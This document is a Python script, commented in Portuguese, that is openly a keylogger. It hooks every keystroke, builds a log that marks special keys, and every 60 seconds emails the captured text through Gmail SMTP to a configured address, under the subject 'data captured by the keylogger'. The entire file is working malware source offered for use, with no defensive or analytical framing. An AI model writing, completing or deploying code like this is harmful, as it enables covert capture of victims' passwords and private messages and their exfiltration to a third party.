import smtplib
from email.mime.text import MIMEText
from threading import Timer
import keyboard

log = ""

#Configurações de e-mail
EMAIL_ORIGEM = ""
EMAIL_DESTINO = ""
SENHA_EMAIL = ""

def enviar_email():
    global log
    if not log:
        Timer(60, enviar_email).start()
        return

    try:
        msg = MIMEText(log)
        msg['Subject'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()

    except Exception as e:
        print("Erro ao enviar:", e)

    log = ""

    #Agendamento a cada 60 segundos
    Timer(60, enviar_email).start()

def on_press(event):
    global log
    key = event.name
    try:
        if key == "space":
            log += " "
        elif key == "enter":
            log += "\n"
        elif key == "tab":
            log += "\t"
        elif key == "backspace":
            log += "[BKSP]"
        elif key == "decimal":
            log += "."
        elif len(key) > 1:
            # shift, ctrl, alt, etc. → ignora ou marca
            log += f"[{key.upper()}]"
            #print(key, end="")
        else:
            log += key
    except AttributeError:
        pass

keyboard.on_press(on_press)
enviar_email()
keyboard.wait()  # bloqueia o script (equivale ao listener.join())
